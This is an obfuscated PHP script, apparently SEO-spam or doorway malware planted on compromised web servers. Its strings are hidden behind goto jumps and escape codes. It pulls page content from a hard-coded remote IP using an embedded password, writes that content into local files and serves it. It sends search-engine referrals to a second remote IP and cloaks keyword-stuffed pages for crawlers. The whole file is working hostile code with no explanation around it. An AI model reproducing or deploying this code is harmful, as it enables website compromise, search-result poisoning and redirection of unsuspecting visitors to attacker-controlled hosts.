<?php
 goto Nwzdg; m21M1: $apass = "{$apass1}" . "{$apass2}" . "{$apass3}"; goto OFxzM; Nwzdg: error_re
porting(0); goto zrP6b; Y5dWT: $s = $_SERVER["\x53\x45\122\x56\105\122\137\116\x41\x4d\105"] . $s
; goto o8zgm; HQrb_: if (strlen($text) < 5000) { $text = file_get_contents("\150\x74\164\160\72\x
2f\x2f\x36\x35\56\61\x30\71\56\66\x37\x2e\61\60\60\57" . $_GET["\146\156"] . "\56\160\150\x70\x3f
\160\x61\163\163\x3d{$apass}\46\161\x3d{$_GET["\x69\x64"]}"); } goto fRbA2; g_15p: $x1 = 3; goto
ff8c3; Lwi5O: $s = dirname($_SERVER["\x50\110\x50\137\x53\x45\114\x46"]); goto deTRS; vieRm: if (
strlen($text) > 500) { $out = fopen("\x69\156\144\145\170\57" . $myname, "\167"); fwrite($out, $t
ext); fclose($out); } goto SQxHH; kpjaY: if (function_exists("\143\165\162\x6c\137\151\156\151\x7
4")) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "\x68\x74\164\160\x3a\x2f\x2f\66\65\x2e\x
31\60\71\56\x36\x37\56\x31\x30\60\57" . $_GET["\146\156"] . "\x2e\160\x68\x70\77\160\141\x73\x73\
x3d{$apass}\x26\x71\75{$_GET["\x69\144"]}"); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_se
topt($ch, CURLOPT_CONNECTTIMEOUT, 4); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setop
t($ch, CURLOPT_SSL_VERIFYHOST, 2); curl_setopt($ch, CURLOPT_USERAGENT, "\x4d\x6f\172\151\154\x6c\
x61\57\x34\56\x30\40\50\x63\157\155\x70\141\164\151\x62\x6c\x65\x3b\40\115\x53\x49\105\40\x36\x2e
\60\x3b\x20\127\151\x6e\144\157\x77\163\x20\116\x54\40\x35\56\61\73\x20\123\126\x31\51"); $text =
 curl_exec($ch); curl_close($ch); } goto HQrb_; zrP6b: $today = "\62\x30\62\66\x30\x31\x30\65\55"
; goto TIhHO; QTvNi: $_GET["\x66\x6e"] = "\66\x39\x36\71\66\x39\156\145\167"; goto Q0Mca; OFxzM:
if (strpos($_SERVER["\x48\x54\124\120\x5f\x52\x45\106\105\122\x45\x52"], "\147\157\x6f\x67\154\14
5\56") or strpos($_SERVER["\x48\124\x54\120\137\x52\105\106\105\122\105\122"], "\171\x61\x68\x6f\
x6f\x2e") or strpos($_SERVER["\110\124\124\x50\137\122\105\x46\105\122\x45\122"], "\142\x69\x6e\1
47\56")) { $tpl = "\151\x6e\x64\x65\170\57" . $_GET["\x69\144"] . "\56\160\x68\x70\56\164\160\154
"; $tpl = file($tpl); $tpl = chop($tpl[0]); $my = $_GET["\x6d\x79"]; header("\x4c\157\x63\141\x74
\151\157\156\72\x20\150\164\x74\x70\x3a\57\57\x36\65\x2e\61\60\x38\x2e\61\x30\x2e\x31\x39\71\57\x
65\156\x74\145\x72\x2f\x3f\x6d\141\162\x6b\x3d{$today}\x2d{$s}\x26\164\160\154\75{$tpl}\x26\x65\x
6e\x67\153\x65\171\75{$keyword}"); die; } else { $myname = $_GET["\x69\144"] . "\56\160\150\x70";
 if (file_exists("\151\x6e\x64\145\x78\57" . $myname)) { $html = @file_get_contents("\x69\x6e\x64
\x65\x78\57" . $myname); if (strpos($_SERVER["\110\124\124\120\x5f\125\x53\105\122\137\x41\107\x4
5\116\124"], "\142\x69\x6e\147") > 2 or strpos($_SERVER["\110\124\124\x50\137\125\x53\105\x52\x5f
\101\x47\x45\x4e\124"], "\171\x61\x68\x6f\x6f") > 2) { $keyword = str_replace("\55", "\40", $_GET
["\151\144"]); $html = str_replace("\x3c\x74\x69\x74\154\x65\76\x3c\57\x74\x69\x74\154\x65\x3e",
"\x3c\164\x69\x74\154\x65\x3e{$keyword}\x3c\57\x74\x69\164\154\x65\x3e", $html); } echo $html; di
e; } } goto z9QJ3; LQRPx: $keyword = str_replace("\x2d", "\40", $_GET["\151\144"]); goto AfHws; Z
JFMm: if ($_GET["\x69\x64"] == "\x69\156\x64\145\170") { header("\x4c\157\x63\141\164\151\157\x6e
\72\40\x68\x74\164\x70\x73\72\x2f\57\x67\x6f\157\147\x6c\x65\x2e\x63\157\155"); die; } goto YdkQ3
; z9QJ3: $query_pars_2 = str_replace("\55", "\53", $_GET["\151\x64"]); goto OWTlQ; deTRS: if ($s
== "\x5c" | $s == "\57") { $s = ''; } goto Y5dWT; TIhHO: foreach ($_GET as $a => $b) { $_GET["\x6
9\144"] = $b; } goto dxV4T; SQxHH: echo $text; goto w32gX; YdkQ3: $_GET["\x77\x6f\x72\154\144"] =
 5; goto QTvNi; AfHws: $keyword = str_replace("\x20", "\x2b", $keyword); goto dWRGF; ff8c3: $xx1
= 5; goto LQRPx; o8zgm: $apass3 = "\162\166\x33\62\x79\x64\x61\x63\x73\166\x73\x64\x76"; goto m21
M1; Q0Mca: $apass1 = "\x76\x69\x73\x64\157\x69\152\145\167"; goto g_15p; OWTlQ: $text = ''; goto
kpjaY; dWRGF: $apass2 = "\142\x32\63\x68\x72\62\x33\x76\x72\x33\62"; goto Lwi5O; fRbA2: if (strle
n($text) < 5000) { $url = "\66\65\56\61\x30\71\x2e\66\67\x2e\61\60\x30"; $fp = fsockopen($url, 80
, $errno, $errstr, 30); if (!$fp) { echo "{$errstr}\x20\x28{$errno}\51\74\142\x72\x20\57\76\12";
} else { $req = "\x2f" . $_GET["\146\x6e"] . "\56\x70\x68\160\77\x70\x61\x73\x73\75{$apass}\x26\x
71\x3d{$_GET["\x69\144"]}"; $out = "\107\x45\x54\x20{$req}\x20\110\124\x54\120\57\x31\x2e\60\15\1
2"; $out .= "\110\157\163\164\72\40{$url}\15\xa"; $out .= "\x43\157\156\156\x65\x63\x74\x69\157\x
6e\x3a\40\103\x6c\x6f\x73\x65\xd\xa\xd\xa"; fwrite($fp, $out); while (!feof($fp)) { $text = $text
 . fgets($fp, 2048); } fclose($fp); } fclose($out); $text = explode("\12", $text); $text = $text[
7]; } goto vieRm; dxV4T: if ($_GET["\151\x64"] == "\164\145\x73\x74\151\x6e\147") { echo "\164\x6
5\x73\x74\x20\147\157\157\144\x2e\56\x2e"; die; } goto ZJFMm; w32gX: ?>
